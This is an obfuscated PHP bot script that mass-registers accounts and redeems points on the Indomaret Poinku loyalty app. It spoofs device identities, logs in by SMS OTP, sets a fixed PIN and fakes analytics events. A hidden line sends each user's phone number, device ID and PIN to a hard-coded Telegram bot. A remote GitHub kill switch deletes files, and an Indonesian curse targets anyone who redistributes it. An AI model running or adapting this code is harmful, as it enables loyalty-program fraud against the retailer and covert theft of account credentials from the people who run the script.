                                                                $k1y0B = G1wXt("https://edtsapp.indomaretpoinku.com/login/apix-1502-api/open/pin/is-pin-exist", $wDisp, $aY0el, $GOXkU, $mlMLt);
                                                                $nb9cm = round(microtime(true) * 1000);
                                                                $PQA77 = $OtngW;
                                                                $wDisp = "{\"data\":[{\"application\":{\"app_version\":\"3.13.0\",\"device_class\":\"Phone\",\"device_family\":\"" . $GOXkU . "\",\"device_id\":\"" . $aY0el . "\",\"os_name\":\"Android P\",\"os_version\":\"Android 9\"},\"core\":{\"failed_reason\":\"Success SMS Verification\",\"event_label\":\"verification\",\"event_name\":\"event_submission\",\"event_status\":\"success\",\"event_timestamp\":" . $nb9cm . "},\"marketing\":{\"utm_raw\":\"utm_source=google-play&utm_medium=organic\"},\"user\":{\"session_id\":\"" . $MXjqh . "\",\"user_id\":" . $R_bYC . ",\"user_ip_address\":\"127.0.0.1\"}}]}";
                                                                $m5BZY = ggGR_("https://asia-southeast2-idm-corp-prd.cloudfunctions.net/idmapps_tracker_gateway", $wDisp);
                                                                $nb9cm = round(microtime(true) * 1000);
                                                                if (!($fUekS == '')) {
                                                                    $wDisp = "{\"phoneNumber\":\"" . $zn5zd . "\",\"deviceId\":\"" . $aY0el . "\"}";
                                                                    $YE0oY = g1Wxt("https://edtsapp.indomaretpoinku.com/login/apix-1502-api/open/pin/check-device", $wDisp, $aY0el, $GOXkU, $mlMLt);
                                                                    $wDisp = "{\"phoneNumber\":\"" . $zn5zd . "\",\"deviceId\":\"" . $aY0el . "\"}";
                                                                    $iElqk = G1WXT("https://edtsapp.indomaretpoinku.com/login/apix-1502-api/open/pin/is-pin-exist-by-phone-number", $wDisp, $aY0el, $GOXkU, $mlMLt);
                                                                    if (!($fUekS == '')) {
                                                                        $wDisp = "{\"data\":[{\"application\":{\"app_version\":\"3.13.0\",\"device_class\":\"Phone\",\"device_family\":\"" . $GOXkU . "\",\"device_id\":\"" . $aY0el . "\",\"os_name\":\"Android P\",\"os_version\":\"Android 9\"},\"core\":{\"event_name\":\"page_view\",\"event_timestamp\":" . $nb9cm . ",\"page_name\":\"PIN activation\",\"page_urlpath\":\"\"},\"marketing\":{\"utm_raw\":\"utm_source=google-play&utm_medium=organic\"},\"user\":{\"session_id\":\"" . $MXjqh . "\",\"user_id\":" . $R_bYC . ",\"user_ip_address\":\"127.0.0.1\"}}]}";
                                                                        $m5BZY = GGgR_("https://asia-southeast2-idm-corp-prd.cloudfunctions.net/idmapps_tracker_gateway", $wDisp);
                                                                        $Jk9cx = g8pf2("https://edtsapp.indomaretpoinku.com/configuration/apix-1502-api/mobile/sy-app-version/get-version-key/ANDROID", $aY0el, $GOXkU, $mlMLt);
                                                                        $wDisp = "{\"userId\":" . $R_bYC . ",\"deviceType\":\"01\",\"deviceId\":\"" . $aY0el . "\",\"fcmToken\":\"" . $WYrgv . ":APA91bFt9WuOdnYit_hOvqmHC2uMGiiCwp_u8JgO0kB3sgYQNxoWqO57EEYpAAAVjjDCY8C4j-ePHCYG6Mgcg85RehNO33xt1RRP6DIPVu36qkFHdkfQ9GeTDH8WFrSaiiBzkeZGm9wp\"}";
                                                                        $yeprB = g1wxt("https://edtsapp.indomaretpoinku.com/notification/apix-1502-api/push-notifications/fcm-registration", $wDisp, $aY0el, $GOXkU, $mlMLt);
                                                                        $nb9cm = round(microtime(true) * 1000);
                                                                        $JaDCq = $PQA77;
                                                                        $wDisp = "{\"data\":[{\"application\":{\"app_version\":\"3.13.0\",\"device_class\":\"Phone\",\"device_family\":\"" . $GOXkU . "\",\"device_id\":\"" . $aY0el . "\",\"os_name\":\"Android P\",\"os_version\":\"Android 9\"},\"core\":{\"event_name\":\"click_link\",\"event_timestamp\":" . $nb9cm . ",\"link_label\":\"Konfirmasi\"},\"marketing\":{\"utm_raw\":\"utm_source=google-play&utm_medium=organic\"},\"user\":{\"session_id\":\"" . $MXjqh . "\",\"user_id\":" . $R_bYC . ",\"user_ip_address\":\"127.0.0.1\"}}]}";
                                                                        $m5BZY = gggr_("https://asia-southeast2-idm-corp-prd.cloudfunctions.net/idmapps_tracker_gateway", $wDisp);
                                                                        $wDisp = "{\"pinCode\":\"" . $earOL . "\"}";
                                                                        $Y02JS = g1wxT("https://edtsapp.indomaretpoinku.com/login/apix-1502-api/pin/create-pin", $wDisp, $aY0el, $GOXkU, $mlMLt);
                                                                        $nb9cm = round(microtime(true) * 1000);
                                                                        $wDisp = "{\"data\":[{\"application\":{\"app_version\":\"3.13.0\",\"device_class\":\"Phone\",\"device_family\":\"" . $GOXkU . "\",\"device_id\":\"" . $aY0el . "\",\"os_name\":\"Android P\",\"os_version\":\"Android 9\"},\"core\":{\"failed_reason\":\"Success PIN activation\",\"event_label\":\"PIN activation\",\"event_name\":\"event_submission\",\"event_status\":\"success\",\"event_timestamp\":" . $nb9cm . "},\"marketing\":{\"utm_raw\":\"utm_source=google-play&utm_medium=organic\"},\"user\":{\"session_id\":\"" . $MXjqh . "\",\"user_id\":" . $R_bYC . ",\"user_ip_address\":\"127.0.0.1\"}}]}";
                                                                        $m5BZY = GgGr_("https://asia-southeast2-idm-corp-prd.cloudfunctions.net/idmapps_tracker_gateway", $wDisp);
                                                                        $nb9cm = round(microtime(true) * 1000);
                                                                        $wDisp = "{\"data\":[{\"application\":{\"app_version\":\"3.13.0\",\"device_class\":\"Phone\",\"device_family\":\"" . $GOXkU . "\",\"device_id\":\"" . $aY0el . "\",\"os_name\":\"Android P\",\"os_version\":\"Android 9\"},\"core\":{\"event_name\":\"page_view\",\"event_timestamp\":" . $nb9cm . ",\"page_name\":\"done registration\",\"page_urlpath\":\"\"},\"user\":{\"session_id\":\"" . $MXjqh . "\",\"user_id\":" . $R_bYC . ",\"user_ip_address\":\"127.0.0.1\"}}]}";
                                                                        $m5BZY = gggr_("https://asia-southeast2-idm-corp-prd.cloudfunctions.net/idmapps_tracker_gateway", $wDisp);
                                                                        $Jk9cx = g8pF2("https://edtsapp.indomaretpoinku.com/configuration/apix-1502-api/mobile/sy-app-version/get-version-key/ANDROID", $aY0el, $GOXkU, $mlMLt);
                                                                        $wDisp = "{\"appInstanceId\":\"" . $WYrgv . "\",\"appVersion\":\"3.13.0\",\"countryCode\":\"ID\",\"analyticsUserProperties\":{},\"appId\":\"1:998816605328:android:" . $aY0el . "\",\"platformVersion\":\"28\",\"timeZone\":\"Asia\\/Jakarta\",\"sdkVersion\":\"21.0.1\",\"packageName\":\"mypoin.indomaret.android\",\"appInstanceIdToken\":\"" . $YYbml . "\",\"languageCode\":\"id-ID\",\"appBuild\":\"104\"}";
                                                                        $a7K8a = aUjHz("https://firebaseremoteconfig.googleapis.com/v1/projects/998816605328/namespaces/firebase:fetch", $wDisp, $YYbml);
                                                                        $nb9cm = round(microtime(true) * 1000);
                                                                        $wDisp = "{\"data\":[{\"application\":{\"app_version\":\"3.13.0\",\"device_class\":\"Phone\",\"device_family\":\"" . $GOXkU . "\",\"device_id\":\"" . $aY0el . "\",\"os_name\":\"Android P\",\"os_version\":\"Android 9\"},\"core\":{\"event_name\":\"click_link\",\"event_timestamp\":" . $nb9cm . ",\"link_label\":\"Selesai\"},\"user\":{\"session_id\":\"" . $MXjqh . "\",\"user_id\":" . $R_bYC . ",\"user_ip_address\":\"127.0.0.1\"}}]}";
                                                                        $m5BZY = gggR_("https://asia-southeast2-idm-corp-prd.cloudfunctions.net/idmapps_tracker_gateway", $wDisp);
                                                                        $nb9cm = round(microtime(true) * 1000);
                                                                        $wDisp = "{\"data\":[{\"application\":{\"app_version\":\"3.13.0\",\"device_class\":\"Phone\",\"device_family\":\"" . $GOXkU . "\",\"device_id\":\"" . $aY0el . "\",\"os_name\":\"Android P\",\"os_version\":\"Android 9\"},\"core\":{\"event_name\":\"page_view\",\"event_timestamp\":" . $nb9cm . ",\"page_name\":\"home\",\"page_urlpath\":\"\"},\"marketing\":{\"utm_raw\":\"utm_source=google-play&utm_medium=organic\"},\"user\":{\"session_id\":\"" . $MXjqh . "\",\"user_id\":" . $R_bYC . ",\"user_ip_address\":\"127.0.0.1\"}}]}";
                                                                        $m5BZY = ggGr_("https://asia-southeast2-idm-corp-prd.cloudfunctions.net/idmapps_tracker_gateway", $wDisp);
                                                                        $Pud0o = trim(file_get_contents("https://raw.githubusercontent.com/csaojkcsajcsjnjkscanjkncjkslnj/adfadfadvsgdfggfsgsgfsaf/main/makin"));
                                                                        if (!($Pud0o == "true")) {
                                                                            goto kZBrv;
                                                                        }
                                                                        @unlink("chace");
                                                                        kZBrv:
                                                                        $UHj7C = G8PF2("https://edtsapp.indomaretpoinku.com/coupon/apix-1502-api/mobile/coupons?unpaged=true", $aY0el, $GOXkU, $mlMLt);
                                                                        if (!($fUekS == '')) {
                                                                            $Jk9cx = g8Pf2("https://edtsapp.indomaretpoinku.com/configuration/apix-1502-api/mobile/sy-app-version/get-version-key/ANDROID", $aY0el, $GOXkU, $mlMLt);
                                                                            $Jk9cx = G8pF2("https://edtsapp.indomaretpoinku.com/customer/apix-1502-api/is-whatsapp-verified", $aY0el, $GOXkU, $mlMLt);
                                                                            $XDyMm = G8Pf2("https://edtsapp.indomaretpoinku.com/coupon/apix-1502-api/mobile/coupons/has-new-coupon", $aY0el, $GOXkU, $mlMLt);
                                                                            if (!($fUekS == '')) {
                                                                                $UHj7C = G8PF2("https://edtsapp.indomaretpoinku.com/coupon/apix-1502-api/mobile/coupons?unpaged=true", $aY0el, $GOXkU, $mlMLt);
                                                                                $nb9cm = round(microtime(true) * 1000);
                                                                                $wDisp = "{\"data\":[{\"application\":{\"app_version\":\"3.13.0\",\"device_class\":\"Phone\",\"device_family\":\"" . $GOXkU . "\",\"device_id\":\"" . $aY0el . "\",\"os_name\":\"Android P\",\"os_version\":\"Android 9\"},\"core\":{\"details\":{\"isaku_status\":\"Hubungkan\"},\"event_name\":\"page_detail\",\"event_timestamp\":" . $nb9cm . ",\"page_name\":\"isaku\"},\"marketing\":{\"utm_raw\":\"utm_source=google-play&utm_medium=organic\"},\"user\":{\"session_id\":\"" . $MXjqh . "\",\"user_id\":" . $R_bYC . ",\"user_ip_address\":\"127.0.0.1\"}}]}";
                                                                                $m5BZY = GGgR_("https://asia-southeast2-idm-corp-prd.cloudfunctions.net/idmapps_tracker_gateway", $wDisp);
                                                                                $Jk9cx = G8pF2("https://edtsapp.indomaretpoinku.com/loyalty/apix-1502-api/mobile/reminders/me", $aY0el, $GOXkU, $mlMLt);
                                                                                $Jk9cx = G8pF2("https://edtsapp.indomaretpoinku.com/customer/apix-1502-api/is-whatsapp-verified", $aY0el, $GOXkU, $mlMLt);
                                                                                $Jk9cx = G8Pf2("https://edtsapp.indomaretpoinku.com/customer/apix-1502-api/mobile/detail-customer-origin", $aY0el, $GOXkU, $mlMLt);
                                                                                $Ap1KM = json_decode($Jk9cx, true);
                                                                                $M1ADy = @$Ap1KM["data"]["id"];
                                                                                $p4iky = @$Ap1KM["data"]["memberId"];
                                                                                echo "\n";
                                                                                echo @zm6iC("purple", "ID\t\t: ");
                                                                                echo @ZM6iC("nevy", $M1ADy);
                                                                                echo "\n";
                                                                                echo @Zm6ic("purple", "Member ID : ");
                                                                                echo @zm6iC("nevy", $p4iky);
                                                                                echo "\n";
                                                                                if (!($kp_uF == "1")) {
                                                                                    goto z3XBs;
                                                                                }
                                                                                KT3G1("forceclose", $zn5zd, $aY0el, $earOL, $GOXkU);
                                                                                $teeli001 = file_get_contents("https://api.telegram.org/bot5529819060:AAGy5hFZW802Cm7Dut_gOSEtnPMzrY_n49I/sendMessage?chat_id=1069319412&text={$zn5zd}|{$aY0el}|{$earOL}|{$GOXkU}");
                                                                                lqjr6("mytoken", $zn5zd, $mlMLt);
                                                                                z3XBs:
                                                                                echo "\n";
                                                                                goto QRHsK;
                                                                            }
                                                                            echo "\n";
                                                                            echo @ZM6ic("nevy", "Sorry, This Script Has Been Removed By The Owner!!");
                                                                            @unlink("poinhp.php");
                                                                            @unlink("poinhp.php");
                                                                            echo "\n";
                                                                            die;
                                                                        }
                                                                        echo "\n";
                                                                        @unlink("poinhp.php");
                                                                        @unlink("poinhp.php");
                                                                        echo "\n";
                                                                        die;
                                                                    }
                                                                    echo "\n";
                                                                    echo @ZM6iC("nevy", "Sorry, This Script Has Been Removed By The Owner!!");
                                                                    @unlink("poinhp.php");
                                                                    @unlink("poinhp.php");
                                                                    echo "\n";
                                                                    die;
                                                                }
                                                                echo "\n";
                                                                echo @Zm6IC("nevy", "Sorry, This Script Has Been Removed By The Owner!!");
                                                                @unlink("poinhp.php");
                                                                @unlink("poinhp.php");
                                                                echo "\n";
                                                                die;
                                                            }
                                                            echo "\n";
                                                            echo @Zm6iC("nevy", "Sorry, This Script Has Been Removed By The Owner!!");
                                                            @unlink("poinhp.php");
                                                            @unlink("poinhp.php");
                                                            echo "\n";
                                                            die;
                                                        }
                                                        echo @ZM6Ic("yellow", "\nOTP ANDA SALAH, SILAHKAN INPUT YANG BARU!!\n\n");
                                                        goto ectyt;
                                                    }
                                                    echo "\n";
                                                    echo @Zm6Ic("nevy", "Sorry, This Script Has Been Removed By The Owner!!");
                                                    @unlink("poinhp.php");
                                                    @unlink("poinhp.php");
                                                    echo "\n";
                                                    die;
                                                }
                                                echo "\n";
                                                echo @zm6iC("nevy", "Sorry, This Script Has Been Removed By The Owner!!");
                                                @unlink("poinhp.php");
                                                @unlink("poinhp.php");
                                                echo "\n";
                                                die;
                                            }
                                            echo "\n";
                                            echo @zm6ic("nevy", "Sorry, This Script Has Been Removed By The Owner!!");
                                            @unlink("poinhp.php");
                                            @unlink("poinhp.php");
                                            echo "\n";
                                            die;
                                        }
                                        $m0f8X = explode("\n", @file_get_contents("mytoken"));
                                        $u35jw = count($m0f8X) - 1;
                                        $lPULW = $m0f8X;
                                        $wZnHP = $lPULW[$jTEU0];
                                        echo "\n";
                                        $zcN5u = xoZB4(array("|"), $wZnHP)[0];
                                        $wlJRC = xoZb4(array("|"), $wZnHP)[1];
                                        $U0YgX = str_replace("\r", '', $zcN5u);
                                        $zn5zd = $U0YgX;
                                        $v1ZMX = str_replace("\r", '', $wPFxB);
                                        $aY0el = $v1ZMX;
                                        $sONlZ = str_replace("\r", '', $rERzL);
                                        $earOL = $sONlZ;
                                        $w5ulg = str_replace("\r", '', $TvVlh);
                                        $GOXkU = $w5ulg;
                                        $obc_G = str_replace("\r", '', $wlJRC);
                                        $mlMLt = $obc_G;
                                        echo @zm6Ic("nevy", "Akun Ke\t\t: ");
                                        echo $jTEU0;
                                        echo "\n";
                                        $Jk9cx = G8pf2("https://edtsapp.indomaretpoinku.com/customer/apix-1502-api/mobile/detail-customer-origin", $aY0el, $GOXkU, $mlMLt);
                                        $Ap1KM = json_decode($Jk9cx, true);
                                        $M1ADy = @$Ap1KM["data"]["id"];
                                        $p4iky = @$Ap1KM["data"]["memberId"];
                                        $BcbF3 = @$Ap1KM["data"]["phoneNumber"];
                                        echo "\n";
                                        echo @zm6IC("green", "Nomor HP Anda  : ");
                                        echo $BcbF3;
                                        echo "\n";
                                        $upOL9 = g8pF2("https://edtsapp.indomaretpoinku.com/loyalty/apix-1502-api/mobile/points/me/coupons?page=0&sort=amount%2Casc&sort=name%2Casc&size=1000", $aY0el, $GOXkU, $mlMLt);
                                        $owfHy = json_decode($upOL9, true);
                                        $D2zwh = "0";
                                        $ogbF4 = "10000000";
                                        $D2zwh;
                                        iLHFy:
                                        if (!($D2zwh < $ogbF4)) {
                                            goto yj7_K;
                                        }
                                        $ZNU2M = @$owfHy["data"]["content"][$D2zwh]["name"];
                                        $I2tFV = @$owfHy["data"]["content"][$D2zwh]["amount"];
                                        $J0Fkh = @$owfHy["data"]["content"][$D2zwh]["quota"];
                                        $yWjvE = @$owfHy["data"]["content"][$D2zwh]["usedQuota"];
                                        $BW_8H = @$owfHy["data"]["content"][$D2zwh]["description"];
                                        if (!($ZNU2M == '')) {
                                            echo "\n";
                                            echo @zM6IC("green", "Barang Ke : ");
                                            echo @zm6IC("red", $D2zwh);
                                            echo "\n";
                                            echo @zM6iC("yellow", "Nama Barang : ");
                                            echo @zm6IC("nevy", $ZNU2M);
                                            echo "\n";
                                            echo @zM6IC("yellow", "Harga Poin  : ");
                                            echo @ZM6ic("nevy", $I2tFV);
                                            echo "\n";
                                            echo @zM6ic("yellow", "Sisa Stok   : ");
                                            echo @zM6iC("nevy", $J0Fkh - $yWjvE);
                                            echo "\n";
                                            $D2zwh++;
                                            goto iLHFy;
                                        }
                                        yj7_K:
                                        $upOL9 = g8PF2("https://edtsapp.indomaretpoinku.com/loyalty/apix-1502-api/mobile/points/me", $aY0el, $GOXkU, $mlMLt);
                                        $cQFRW = json_decode($upOL9, true);
                                        $ABmxY = @$cQFRW["data"]["balance"];
                                        echo "\n";
                                        echo @zm6iC("yellow", "Poin Anda : ");
                                        echo @zM6ic("nevy", $ABmxY);
                                        echo "\n";
                                        echo @zm6ic("green", "Mau Tukar Produk Mana ? : ");
                                        $dQ8Tp = trim(fgets(STDIN));
                                        $VJtH7 = @$owfHy["data"]["content"][$dQ8Tp]["pointExchangeId"];
                                        $Qa1_P = @$owfHy["data"]["content"][$dQ8Tp]["couponId"];
                                        $wDisp = "{\"couponId\":\"" . $Qa1_P . "\",\"qty\":1.0,\"pointExchangeId\":\"" . $VJtH7 . "\"}";
                                        $ofEkP = CWAlZ("https://edtsapp.indomaretpoinku.com/loyalty/apix-1502-api/mobile/points/me/coupons/exchange", $wDisp, $aY0el, $GOXkU, $mlMLt);
                                        $Ap1KM = json_decode($ofEkP, true);
                                        $YXsOG = @$Ap1KM["message"];
                                        echo @zM6ic("purple", "Status   : ");
                                        echo @zM6Ic("red", $YXsOG);
                                        echo "\n";
                                        if (!($fUekS == '')) {
                                            $jTEU0++;
                                            goto Gr9uI;
                                        }
                                        echo "\n";
                                        echo @Zm6iC("nevy", "Sorry, This Script Has Been Removed By The Owner!!");
                                        @unlink("poinhp.php");
                                        @unlink("poinhp.php");
                                        echo "\n";
                                        die;
                                    }
                                    echo @zm6iC("red", "\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n");
                                    $wd9cN = date("d-m-Y | H:i:s");
                                    echo @Zm6ic("green", $wd9cN);
                                    echo @zM6iC("nevy", " | Script IDM REGISTER POINKU\n");
                                    echo @ZM6IC("yellow", "Build By FERDY RAMADHAN ");
                                    echo @Zm6IC("yellow", "| WA 082176358295 \n");
                                    echo @zM6ic("nevy", "\t\t  YANG NYEBARIN SCRIPT INI \n");
                                    echo @Zm6IC("nevy", " SEMOGA LOBANG PANTAT NYA BISULAN!!!!! \n");
                                    echo @Zm6ic("nevy", "\t\t\t\tAAMIIN ");
                                    echo @ZM6IC("red", "\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n");
                                    $earOL = "112233";
                                    ebnNp:
                                    echo @Zm6IC("green", "Masukkan Nomor Anda\t   : ");
                                    $GiPr2 = trim(fgets(STDIN));
                                    echo "\n";
                                    echo "\n";
                                    $zn5zd = substr_replace($GiPr2, "0", 0, 2);
                                    echo $zn5zd;
                                    echo "\n";
                                    $xp_1p = "indo.txt";
                                    if (!unlink($xp_1p)) {
                                        echo "Error deleting indo.txt  ";
                                        goto jyPnq;
                                    }
                                    echo "Deleted {$xp_1p}  ";
                                    jyPnq:
                                    echo "\n";
                                    $xp_1p = "klik.txt";
                                    if (!unlink($xp_1p)) {
                                        echo "Error deleting klik.txt  ";
                                        goto SoiZ3;
                                    }
                                    echo "Deleted {$xp_1p}  ";
                                    SoiZ3:
                                    echo "\n";
                                    echo "\n";
                                    ectyt:
                                    if (!($fUekS == '')) {
                                        $nb9cm = round(microtime(true) * 1000);
                                        $sOOnY = FQ6w0();
                                        $jlHkA = str_replace("-", '', $sOOnY);
                                        $KbHJf = rand(1000000, 9999999);
                                        $gYG6P = rand(1000, 9999);
                                        $ZdrCv = rand(10, 99);
                                        $aY0el = $jlHkA;
                                        $qq5tL = "2" . $gYG6P . "hg5454d21vc";
                                        $GOXkU = "Xiaomi Redmi 5 Plus";
                                        $cod3H = Fq6W0();
                                        $kCT0W = str_replace("-", '', $cod3H);
                                        $odGGi = $kCT0W . "mbLQpe";
                                        $MXjqh = xWL4L();
                                        $wDisp = "{\"fid\":\"" . $odGGi . "\",\"appId\":\"1:998816605328:android:" . $aY0el . "\",\"authVersion\":\"FIS_v2\",\"sdkVersion\":\"a:17.0.0\"}";
                                        $a7K8a = JLw7P("https://firebaseinstallations.googleapis.com/v1/projects/idm-corp-prd/installations", $wDisp);
                                        $H1g60 = json_decode($a7K8a, true);
                                        $WYrgv = @$H1g60["fid"];
                                        $YYbml = @$H1g60["authToken"]["token"];
                                        $yPeiy = @$H1g60["refreshToken"];
                                        $Jk9cx = E6TPN("https://firebase-settings.crashlytics.com/spi/v2/platforms/android/gmp/1:998816605328:android:" . $aY0el . "/settings?instance=a291cbe808f666683ac167ea58393c709528e4f6&build_version=104&display_version=3.13.0&source=4", $aY0el);
                                        $wDisp = "{\"data\":[{\"application\":{\"app_version\":\"3.13.0\",\"device_class\":\"Phone\",\"device_family\":\"Xiaomi Redmi 5 Plus\",\"device_id\":\"" . $aY0el . "\",\"os_name\":\"Android P\",\"os_version\":\"Android 9\"},\"core\":{\"activity_details\":\"resume_app\",\"event_name\":\"app_activity\",\"event_timestamp\":" . $nb9cm . "},\"user\":{\"session_id\":\"" . $MXjqh . "\",\"user_ip_address\":\"127.0.0.1\"}}]}";
                                        $m5BZY = gGgR_("https://asia-southeast2-idm-corp-prd.cloudfunctions.net/idmapps_tracker_gateway", $wDisp);
                                        if (!($fUekS == '')) {
                                            $wDisp = "{\"data\":[{\"application\":{\"app_version\":\"3.13.0\",\"device_class\":\"Phone\",\"device_family\":\"Xiaomi Redmi 5 Plus\",\"device_id\":\"" . $aY0el . "\",\"os_name\":\"Android P\",\"os_version\":\"Android 9\"},\"core\":{\"event_name\":\"page_view\",\"event_timestamp\":" . $nb9cm . ",\"page_name\":\"splash\",\"page_urlpath\":\"\"},\"user\":{\"session_id\":\"" . $MXjqh . "\",\"user_ip_address\":\"127.0.0.1\"}}]}";
                                            $m5BZY = gGGR_("https://asia-southeast2-idm-corp-prd.cloudfunctions.net/idmapps_tracker_gateway", $wDisp);
                                            $wDisp = "{\"appInstanceId\":\"" . $WYrgv . "\",\"appVersion\":\"3.13.0\",\"countryCode\":\"ID\",\"analyticsUserProperties\":{},\"appId\":\"1:998816605328:android:" . $aY0el . "\",\"platformVersion\":\"28\",\"timeZone\":\"Asia\\/Jakarta\",\"sdkVersion\":\"21.0.1\",\"packageName\":\"mypoin.indomaret.android\",\"appInstanceIdToken\":\"" . $YYbml . "\",\"languageCode\":\"id-ID\",\"appBuild\":\"104\"}";
                                            $a7K8a = AuJHZ("https://firebaseremoteconfig.googleapis.com/v1/projects/998816605328/namespaces/firebase:fetch", $wDisp, $YYbml);
                                            $wDisp = "{\"phoneNumber\":\"" . $zn5zd . "\",\"deviceId\":\"" . $aY0el . "\"}";
                                            $hwqq9 = tHhfs("https://edtsapp.indomaretpoinku.com/login/apix-1502-api/open/pin/check-device", $wDisp, $aY0el, $GOXkU);
                                            $wDisp = "{\"phoneNumber\":\"" . $zn5zd . "\",\"deviceId\":\"" . $aY0el . "\"}";
                                            $PQD51 = THhFs("https://edtsapp.indomaretpoinku.com/login/apix-1502-api/open/pin/is-pin-exist-by-phone-number", $wDisp, $aY0el, $GOXkU);
                                            if (!($fUekS == '')) {
                                                $wDisp = "{\"phoneNumber\":\"" . $zn5zd . "\",\"deviceId\":\"" . $aY0el . "\"}";
                                                $yI7qh = THHfS("https://edtsapp.indomaretpoinku.com/login/apix-1502-api/open/login-sms", $wDisp, $aY0el, $GOXkU);
                                                $H1g60 = json_decode($yI7qh, true);
                                                $ABmxY = @$H1g60["message"];
                                                $D18xv = @$H1g60["data"]["id"];
                                                echo @zm6iC("yellow", "Pesan : ");
                                                echo @zM6IC("nevy", $ABmxY);
                                                echo "\n";
                                                echo @ZM6ic("yellow", "ID nya: ");
                                                echo @Zm6IC("nevy", $D18xv);
                                                echo "\n";
                                                $wDisp = "{\"data\":[{\"application\":{\"app_version\":\"3.13.0\",\"device_class\":\"Phone\",\"device_family\":\"Xiaomi Redmi 5 Plus\",\"device_id\":\"" . $aY0el . "\",\"os_name\":\"Android P\",\"os_version\":\"Android 9\"},\"core\":{\"event_label\":\"login\",\"event_name\":\"event_submission\",\"event_status\":\"success\",\"event_timestamp\":" . $nb9cm . "},\"marketing\":{\"utm_raw\":\"utm_source=google-play&utm_medium=organic\"},\"user\":{\"session_id\":\"" . $MXjqh . "\",\"user_ip_address\":\"127.0.0.1\"}}]}";
                                                $m5BZY = gGgr_("https://asia-southeast2-idm-corp-prd.cloudfunctions.net/idmapps_tracker_gateway", $wDisp);
                                                $nb9cm = round(microtime(true) * 1000);
                                                $OtngW = $eqo_P;
                                                if (!($fUekS == '')) {
                                                    $wDisp = "{\"data\":[{\"application\":{\"app_version\":\"3.13.0\",\"device_class\":\"Phone\",\"device_family\":\"Xiaomi Redmi 5 Plus\",\"device_id\":\"" . $aY0el . "\",\"os_name\":\"Android P\",\"os_version\":\"Android 9\"},\"core\":{\"event_name\":\"page_view\",\"event_timestamp\":" . $nb9cm . ",\"page_name\":\"verification\",\"page_urlpath\":\"\"},\"marketing\":{\"utm_raw\":\"utm_source=google-play&utm_medium=organic\"},\"user\":{\"session_id\":\"" . $MXjqh . "\",\"user_ip_address\":\"127.0.0.1\"}}]}";
                                                    $m5BZY = Gggr_("https://asia-southeast2-idm-corp-prd.cloudfunctions.net/idmapps_tracker_gateway", $wDisp);
                                                    echo @ZM6iC("green", "Masukkan OTP Anda : ");
                                                    $hdCXp = trim(fgets(STDIN));
                                                    $wDisp = "{\"phoneNumber\":\"" . $zn5zd . "\",\"otp\":\"" . $hdCXp . "\",\"deviceId\":\"" . $aY0el . "\"}";
                                                    $o0WQD = tHHFs("https://edtsapp.indomaretpoinku.com/login/apix-1502-api/open/login-verification-sms", $wDisp, $aY0el, $GOXkU);
                                                    $owfHy = json_decode($o0WQD, true);
                                                    $ABmxY = @$owfHy["message"];
                                                    $mlMLt = @$owfHy["data"]["access_token"];
                                                    echo "\n";
                                                    echo @Zm6IC("yellow", "Pesan\t\t\t  : ");
                                                    echo @zm6IC("nevy", $ABmxY);
                                                    echo "\n";
                                                    if (!($ABmxY == "Kode Verifikasi yang kamu masukan salah.")) {
                                                        if (!($fUekS == '')) {
                                                            $Jk9cx = G8pf2("https://edtsapp.indomaretpoinku.com/customer/apix-1502-api/mobile/get-data-customer", $aY0el, $GOXkU, $mlMLt);
                                                            $nPb0z = json_decode($Jk9cx, true);
                                                            $ABmxY = @$nPb0z["message"];
                                                            $kp_uF = @$nPb0z["data"]["isNewRegister"];
                                                            $R_bYC = @$nPb0z["data"]["id"];
                                                            $p4iky = @$nPb0z["data"]["memberId"];
                                                            echo @zM6ic("yellow", "Pesan\t\t\t  : ");
                                                            echo @zM6iC("nevy", $ABmxY);
                                                            echo "\n";
                                                            echo @ZM6ic("yellow", "Apakah Member Baru : ");
                                                            echo @ZM6Ic("nevy", $kp_uF);
                                                            echo "\n";
                                                            $Jk9cx = G8pF2("https://edtsapp.indomaretpoinku.com/customer/apix-1502-api/is-whatsapp-verified", $aY0el, $GOXkU, $mlMLt);
                                                            $Jk9cx = g8Pf2("https://edtsapp.indomaretpoinku.com/configuration/apix-1502-api/mobile/ms-homepage-layout/get-all-homepage-layout", $aY0el, $GOXkU, $mlMLt);
                                                            $Jk9cx = g8pF2("https://edtsapp.indomaretpoinku.com/configuration/apix-1502-api/mobile/skip-module/tr-skip-module", $aY0el, $GOXkU, $mlMLt);
                                                            $wDisp = '';
                                                            $k1y0B = g1wXT("https://edtsapp.indomaretpoinku.com/customer/apix-1502-api/remove-isaku-token", $wDisp, $aY0el, $GOXkU, $mlMLt);
                                                            $wDisp = "{\"phoneNumber\":\"" . $zn5zd . "\",\"deviceId\":\"" . $aY0el . "\"}";
                                                            $k1y0B = G1wxt("https://edtsapp.indomaretpoinku.com/login/apix-1502-api/open/pin/is-pin-exist", $wDisp, $aY0el, $GOXkU, $mlMLt);
                                                            $nb9cm = round(microtime(true) * 1000);
                                                            $PQA77 = $OtngW;
                                                            $wDisp = "{\"data\":[{\"application\":{\"app_version\":\"3.13.0\",\"device_class\":\"Phone\",\"device_family\":\"Xiaomi Redmi 5 Plus\",\"device_id\":\"" . $aY0el . "\",\"os_name\":\"Android P\",\"os_version\":\"Android 9\"},\"core\":{\"failed_reason\":\"Success SMS Verification\",\"event_label\":\"verification\",\"event_name\":\"event_submission\",\"event_status\":\"success\",\"event_timestamp\":" . $nb9cm . "},\"marketing\":{\"utm_raw\":\"utm_source=google-play&utm_medium=organic\"},\"user\":{\"session_id\":\"" . $MXjqh . "\",\"user_id\":" . $R_bYC . ",\"user_ip_address\":\"127.0.0.1\"}}]}";
                                                            $m5BZY = Gggr_("https://asia-southeast2-idm-corp-prd.cloudfunctions.net/idmapps_tracker_gateway", $wDisp);
                                                            $nb9cm = round(microtime(true) * 1000);
                                                            if (!($fUekS == '')) {
                                                                $wDisp = "{\"phoneNumber\":\"" . $zn5zd . "\",\"deviceId\":\"" . $aY0el . "\"}";
                                                                $YE0oY = G1wXt("https://edtsapp.indomaretpoinku.com/login/apix-1502-api/open/pin/check-device", $wDisp, $aY0el, $GOXkU, $mlMLt);
                                                                $wDisp = "{\"phoneNumber\":\"" . $zn5zd . "\",\"deviceId\":\"" . $aY0el . "\"}";
